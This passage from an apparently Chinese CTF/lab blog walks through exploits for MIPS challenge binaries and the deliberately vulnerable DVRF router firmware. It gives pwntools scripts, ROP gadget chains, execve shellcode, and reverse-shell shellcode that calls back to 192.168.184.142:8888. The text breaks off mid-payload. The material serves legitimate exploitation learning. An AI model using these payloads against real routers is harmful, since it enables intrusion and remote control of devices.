title="8.ret2csu"></a>8.ret2csu</h4><p>使用glibc编译的·MIPS架构程序同样拥有libc_csu_init段，所以使用ret2csu调用ret2win函数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>elf = ELF(<span class="hljs-string">&#x27;ret2csu_mipsel&#x27;</span>)<br>p = process([<span class="hljs-string">&#x27;qemu-mipsel&#x27;</span>,<span class="hljs-string">&#x27;-L&#x27;</span>,<span class="hljs-string">&#x27;/usr/mipsel-linux-gnu&#x27;</span>,<span class="hljs-string">&#x27;./ret2csu_mipsel&#x27;</span>])<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, endian=<span class="hljs-string">&#x27;little&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>gadget1 = <span class="hljs-number">0x4009c0</span><br>gadget2 = <span class="hljs-number">0x4009a0</span><br><br>key1 = <span class="hljs-number">0xDEADBEEF</span><br>key2 = <span class="hljs-number">0xCAFEBABE</span><br>key3 = <span class="hljs-number">0xD00DF00D</span><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">36</span> + p32(gadget1) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1c</span><br>payload += p32(<span class="hljs-number">0x411058</span>)<br>payload += p32(<span class="hljs-number">0</span>)<br>payload += p32(<span class="hljs-number">1</span>)<br>payload += p32(key1)<br>payload += p32(key2)<br>payload += p32(key3)<br>payload += p32(gadget2)<br>payload += p32(<span class="hljs-number">0</span>) * <span class="hljs-number">7</span><br><br>p.sendafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, payload)<br>p.recvuntil(<span class="hljs-string">b&#x27;ROPE&#x27;</span>)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>DVRF路由漏洞靶机中几道题的复现</title>
    <link href="/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/"/>
    <url>/2022/11/08/DVRF%E8%B7%AF%E7%94%B1%E9%9D%B6%E6%9C%BA/</url>
    
    <content type="html"><![CDATA[<p>项目地址：<a href="https://github.com/praetorian-inc/DVRF">https://github.com/praetorian-inc/DVRF</a></p><p>使用binwalk提取固件DVRF_v03.bin</p><p>本地环境：kali-2022.2，qemu-7.0</p><h3 id="stack-bof-02"><a href="#stack-bof-02" class="headerlink" title="stack_bof_02"></a>stack_bof_02</h3><h4 id="栈溢出分析"><a href="#栈溢出分析" class="headerlink" title="栈溢出分析"></a>栈溢出分析</h4><p>使用ida分析，使用strcpy了函数，只要不出现\x00字符，就可以实现栈溢出。</p><p>启动程序：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">qemu-mipsel -L .<span class="hljs-regexp">/ -g 1234 ./</span>pwnable<span class="hljs-regexp">/ShellCode_Required/</span>stack_bof_02 aaaaaaaaaaaaa<br></code></pre></td></tr></table></figure><p>关于溢出的字节数，我是直接用pwndbg观察栈上的地址和程序中的汇编计算出的：0x407ffdd0 + 0x214 -  0x407ffde8 &#x3D; 0x1fc</p><p>​       <img src="/img/5/Screenshot_20221110_055957.png" style="zoom:67%;" />        </p><p>​                                                                     </p><p>由于没有后门函数，这里可以使用shellcode，</p><ol><li>MIPS不支持NX保护，写入栈中的shellcode可以直接被执行；</li><li>使用ROP劫持控制流，虽然程序gadget很少，但libc文件中有大量的gadget，且qemu模拟无法做到地址随机化，libc的基地址每次启动也都是固定的；</li><li>由于缓存不一致性，指令cache和数据cache两者的同步需要一个时间来同步，否则就会失效；这里需要调用sleep函数来让shellcode从数据cache刷新到指令cache，然后在跳转到shellcode去执行。</li></ol><p>libc基地址的寻找：</p> <img src="/img/5/Screenshot_20221110_052742.png" style="zoom:67%;" /><p>查看puts函数的调用 ,然后在libc文件中找到偏移 0x3fefc420 - 0x17420  &#x3D; 0x3fee5000 （不同的环境模拟出的地址也会有所不同）</p><h4 id="编写ROP"><a href="#编写ROP" class="headerlink" title="编写ROP"></a>编写ROP</h4><p>这里我是参考H4lo师傅的<a href="https://www.cnblogs.com/H4lo/p/10542913.html">文章</a>去寻找的gadget</p><p>使用mipsrop找到的gadget跳转到指定地址大多都是通过另一个寄存器去赋值，而原程序中我们溢出后只能控制$ra寄存器，无法控制更多的寄存器；为了方便gadget的使用，首先溢出后劫持到scandir函数结尾部分，让我们可以控制更多的寄存器：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE0 <span class="hljs-number">3</span>C <span class="hljs-number">00</span> BF <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$ra</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s24</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE4 <span class="hljs-number">38</span> <span class="hljs-number">00</span> BE <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$fp</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s20</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFE8 <span class="hljs-number">34</span> <span class="hljs-number">00</span> B7 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s7</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s1C</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFEC <span class="hljs-number">30</span> <span class="hljs-number">00</span> B6 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s6</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s18</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF0 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> B5 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s5</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s14</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF4 <span class="hljs-number">28</span> <span class="hljs-number">00</span> B4 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s4</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s10</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFF8 <span class="hljs-number">24</span> <span class="hljs-number">00</span> B3 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s3</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_sC</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>AFFC <span class="hljs-number">20</span> <span class="hljs-number">00</span> B2 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s2</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s8</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B000 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> B1 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s1</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s4</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B004 <span class="hljs-number">18</span> <span class="hljs-number">00</span> B0 <span class="hljs-number">8</span>F                   lw      <span class="hljs-variable">$s0</span>, <span class="hljs-number">0</span>x18+<span class="hljs-built_in">var_s0</span>(<span class="hljs-variable">$sp</span>)<br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B008 <span class="hljs-number">08</span> <span class="hljs-number">00</span> E0 <span class="hljs-number">03</span>                   jr      <span class="hljs-variable">$ra</span><br><span class="hljs-selector-class">.text</span>:<span class="hljs-number">0000</span>B00C <span class="hljs-number">40</span> <span class="hljs-number">00</span> BD <span class="hljs-number">27</span>                   addiu   <span class="hljs-variable">$sp</span>, <span class="hljs-number">0</span>x40<br></code></pre></td></tr></table></figure><p>再使用mipsrop.find(“li $a0,1”)找到相应的gadget，将$a0赋值为1，作为sleep函数的参数，如果$a0本身就存在值也可以不用这个操作，可能sleep的时间会长一点：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB10 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">04</span> <span class="hljs-number">24</span>                   li      $a0, <span class="hljs-number">1</span><br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB14 <span class="hljs-number">21</span> C8 <span class="hljs-number">20</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s1<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">0002</span>FB18 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br></code></pre></td></tr></table></figure><p>调用sleep函数后还需要进一步调用shellcode，所以给$a0赋值值后不能直接去执行sleep函数，这里要进一步调用xdr_union函数结尾部分，执行完sleep函数后可以继续沿着ROP链执行：</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C34 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move </span>   $<span class="hljs-built_in">t9</span>, $<span class="hljs-built_in">s3</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C38 <span class="hljs-number">2</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">BF </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">ra</span>, <span class="hljs-number">0x18</span>+var_s14($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C3C <span class="hljs-number">28</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B4 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s4</span>, <span class="hljs-number">0x18</span>+var_s10($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C40 <span class="hljs-number">24</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B3 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s3</span>, <span class="hljs-number">0x18</span>+var_sC($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C44 <span class="hljs-number">20</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B2 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s2</span>, <span class="hljs-number">0x18</span>+var_s8($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C48 <span class="hljs-number">1</span>C <span class="hljs-number">00</span> <span class="hljs-keyword">B1 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s1</span>, <span class="hljs-number">0x18</span>+var_s4($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C4C <span class="hljs-number">18</span> <span class="hljs-number">00</span> <span class="hljs-keyword">B0 </span><span class="hljs-number">8</span>F                   <span class="hljs-keyword">lw </span>     $<span class="hljs-built_in">s0</span>, <span class="hljs-number">0x18</span>+var_s0($<span class="hljs-built_in">sp</span>)<br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C50 <span class="hljs-number">08</span> <span class="hljs-number">00</span> <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   <span class="hljs-keyword">jr </span>     $<span class="hljs-built_in">t9</span><br><span class="hljs-symbol">.text:</span><span class="hljs-number">00021</span>C54 <span class="hljs-number">30</span> <span class="hljs-number">00</span> <span class="hljs-keyword">BD </span><span class="hljs-number">27</span>                   <span class="hljs-keyword">addiu </span>  $<span class="hljs-built_in">sp</span>, <span class="hljs-number">0x30</span><br></code></pre></td></tr></table></figure><p>最后使用mipsrop.stackfinders()找到获取栈地址的相对偏移的gadget；使用mipsrop.tail()或mipsrop.find(“”)找到跳转地址的gadget，通过偏移量写入shellcode，找出如下gadget：</p><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs maxima">.text:<span class="hljs-number">0001B230</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">00</span> <span class="hljs-number">02</span>                   move    $t9, $s0<br>.text:<span class="hljs-number">0001B234</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">0001B238</span> <span class="hljs-number">28</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_10<br><br>.text:<span class="hljs-number">000214A0</span> <span class="hljs-number">21</span> C8 <span class="hljs-number">80</span> <span class="hljs-number">00</span>                   move    $t9, $a0<br>.text:<span class="hljs-number">000214A4</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A2 AF                   sw      $v0, <span class="hljs-number">0x30</span>+var_18($sp)<br>.text:<span class="hljs-number">000214A8</span> <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.text:<span class="hljs-number">000214AC</span> <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x30</span>+var_18<br></code></pre></td></tr></table></figure><p>​                             </p><p>完整的ROP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a2, $zero, -1</span><br><span class="hljs-string">    li $t7, 0x69622f2f</span><br><span class="hljs-string">    sw $t7, -12($sp)</span><br><span class="hljs-string">    li $t6, 0x68732f6e</span><br><span class="hljs-string">    sw $t6, -8($sp)</span><br><span class="hljs-string">    sw $zero, -4($sp)</span><br><span class="hljs-string">    la $a0, -12($sp)</span><br><span class="hljs-string">    slti $a1, $zero, -1</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x40404</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br>payload =  <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x1fc</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#fp</span><br>payload += p32(libcbase + <span class="hljs-number">0x2fb10</span>)    <span class="hljs-comment">#ra</span><br><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += p32(libcbase + <span class="hljs-number">0x214a0</span>)    <span class="hljs-comment">#s0</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s2</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += p32(libcbase + <span class="hljs-number">0x1b230</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x28</span><br>payload += shellcode<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;payload&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    f.write(payload)<br></code></pre></td></tr></table></figure><p>最后调用该payload</p><img src="/img/5/Screenshot_20221111_032920.png" style="zoom:67%;" /><h4 id="题外话"><a href="#题外话" class="headerlink" title="题外话"></a>题外话</h4><p>H4lo师傅第一个版本的ROP通过mipsrop.stackfinders()是找到 <code>0x000171CC</code> 这一处的 gadget：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs mel">.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>CC <span class="hljs-number">18</span> <span class="hljs-number">00</span> A4 <span class="hljs-number">27</span>                   addiu   $a0, $sp, <span class="hljs-number">0x38</span>+var_20<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D0 <span class="hljs-number">21</span> C8 <span class="hljs-number">60</span> <span class="hljs-number">02</span>                   <span class="hljs-keyword">move</span>    $t9, $s3<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D4 <span class="hljs-number">09</span> F8 <span class="hljs-number">20</span> <span class="hljs-number">03</span>                   jalr    $t9<br>.<span class="hljs-keyword">text</span>:<span class="hljs-number">000171</span>D8 <span class="hljs-number">01</span> <span class="hljs-number">00</span> <span class="hljs-number">05</span> <span class="hljs-number">24</span>                   li      $a1, <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>最后也是通过<code>0x000214A0</code> 的gadget跳转到shellcode，<code>0x000171CC</code> 处的 gadget获取栈地址的相对偏移是sp + 0x18，并依此写入0x18字节的数据填充，然后写入shellcode，而<code>0x000214A0</code> 处会有<code>sw   $v0, 0x18($sp)</code>的操作，最后会将shellcode的前4位字节赋值为$v0寄存器的值，如下图：</p><img src="/img/5/Screenshot_20221110_053319.png" style="zoom: 80%;" /><p>虽然最后也可以成功执行shellcode，但是对于后面的socket_bof这种题就无法成功；所以最好继续多写入4字节的数据填充，然后写入shellcode，这样就不会让shellcode上的数据被修改。</p><p>不过H4lo师傅第二个版本的ROP就没有使用该处的gadget。</p><h3 id="socket-bof"><a href="#socket-bof" class="headerlink" title="socket_bof"></a>socket_bof</h3><p>使用ida查看伪代码：</p><p><img src="/img/5/Screenshot_20221111_090157.png"></p><p>read函数输入字符到v10上后，再由sprintf函数将v10的字符加上“nom nom nom, you sent me ”这串字符一同复制到v11上，最后的溢出也是v11的溢出，所以在调试时在栈上应找到如下地址去计算溢出长度：</p><img src="/img/5/Screenshot_20221111_093723.png" style="zoom: 80%;" /><p>溢出后的ROP可以直接使用上一题stack_bof_02的，最后将shellcode改为可以反弹shell的代码。</p><p>可以参考shell-storm上的<a href="http://shell-storm.org/shellcode/files/shellcode-860.html">代码</a>，再改一下ip和端口即可</p><p>完整exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(arch=<span class="hljs-string">&#x27;mips&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br>libcbase = <span class="hljs-number">0x3fee5000</span><br>_sleep = libcbase + <span class="hljs-number">0x2f2b0</span><br><br>shellcode = asm(<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    slti $a0, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a0, $zero, 0x1111</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    li $v0, 4006</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFFD</span><br><span class="hljs-string">    not $a0, $t4</span><br><span class="hljs-string">    not $a1, $t4</span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4183</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    andi $a0, $v0, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">    li $v0, 4041</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $a1, 0xB821 # Port: 8888</span><br><span class="hljs-string">    ori $a1, 0xFF01</span><br><span class="hljs-string">    addi $a1, $a1, 0x0101</span><br><span class="hljs-string">    sw $a1, -8($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $a1, 0x8EB8A8C0 # IP: 192.168.184.142</span><br><span class="hljs-string">    sw $a1, -4($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    li $t4, 0xFFFFFFEF</span><br><span class="hljs-string">    not $a2, $t4</span><br><span class="hljs-string">    li $v0, 4170</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6962</span><br><span class="hljs-string">    ori $t0, $t0,0x2f2f</span><br><span class="hljs-string">    sw $t0, -20($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    lui $t0, 0x6873</span><br><span class="hljs-string">    ori $t0, 0x2f6e</span><br><span class="hljs-string">    sw $t0, -16($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a3, $zero, 0xFFFF</span><br><span class="hljs-string">    sw $a3, -12($sp)</span><br><span class="hljs-string">    sw $a3, -4($sp)</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addi $a0, $sp, -20</span><br><span class="hljs-string">    addi $t0, $sp, -20</span><br><span class="hljs-string">    sw $t0, -8($sp)</span><br><span class="hljs-string">    addi $a1, $sp, -8</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    addiu $sp, $sp, -20</span><br><span class="hljs-string"> </span><br><span class="hljs-string">    slti $a2, $zero, 0xFFFF</span><br><span class="hljs-string">    li $v0, 4011</span><br><span class="hljs-string">    syscall 0x42424</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span>)<br><br><br>payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">51</span> + p32(libcbase + <span class="hljs-number">0xafe0</span>)<br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x18</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s0</span><br>payload += p32(libcbase + <span class="hljs-number">0x21c34</span>)    <span class="hljs-comment">#s1</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>     <span class="hljs-comment">#s2</span><br>payload += p32(_sleep)    <span class="hljs-comment">#s3</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s4</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s5</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s6</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">4</span>    <span class="hljs-comment">#s7</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span> * <span 